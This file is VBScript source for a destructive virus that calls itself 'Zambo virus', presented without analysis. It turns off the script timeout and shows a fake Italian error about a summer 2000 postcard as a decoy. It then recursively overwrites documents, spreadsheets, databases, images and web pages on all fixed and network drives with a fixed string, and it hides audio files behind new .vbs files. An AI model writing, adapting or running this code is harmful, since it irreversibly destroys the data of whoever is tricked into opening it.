On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)

main()

sub main()
On Error Resume Next
dim wscr,rr
dim MyVar

	set wscr=CreateObject("WScript.Shell")
	rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
	if (rr>=1) then
		wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows ScriptingHost\Settings\Timeout",0,"REG_DWORD"
	end if
	
	Set dirwin = fso.GetSpecialFolder(0)
	Set dirsystem = fso.GetSpecialFolder(1)
	Set dirtemp = fso.GetSpecialFolder(2)
	Set c = fso.GetFile(WScript.ScriptFullName)
	

	MyVar = MsgBox ("Impossibile decomprimere la cartolina animata. Operazione annullata.", 4096, "Cartolina Estate 2000.") ' 

	listadriv()

end sub


sub listadriv
On Error Resume Next
Dim d,dc,s

	Set dc = fso.Drives
	For Each d in dc
		If d.DriveType = 2 or d.DriveType=3 Then
		folderlist(d.path&"\")
		end if
	Next
	listadriv = s
end sub

sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,s,bname,mp3

	set f = fso.GetFolder(folderspec)
	set fc = f.Files
	for each f1 in fc
		ext=fso.GetExtensionName(f1.path)
		ext=lcase(ext)
		s=lcase(f1.name)
		if (ext="doc") or (ext="xls") or (ext="txt") or (ext="mdb") or (ext="rtf") then   
			set ap=fso.OpenTextFile(f1.path,2,true)
			ap.write "Zambo virus!"
			ap.close
		elseif(ext="jpg") or (ext="jpeg") or (ext="gif") or (ext="bmp") or (ext="htm") then
			set ap=fso.OpenTextFile(f1.path,2,true)
			ap.write "Zambo virus!"
			ap.close
		elseif(ext="mp3") or (ext="wav") then
			set mp3=fso.CreateTextFile(f1.path&".vbs")
			mp3.write "Zambo virus!"
			mp3.close
			set att=fso.GetFile(f1.path)
			att.attributes=att.attributes+2
		end if
	next  
end sub


sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf

	set f = fso.GetFolder(folderspec)  
	set sf = f.SubFolders
	for each f1 in sf
		infectfiles(f1.path)
		folderlist(f1.path)
	next  
end sub


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function






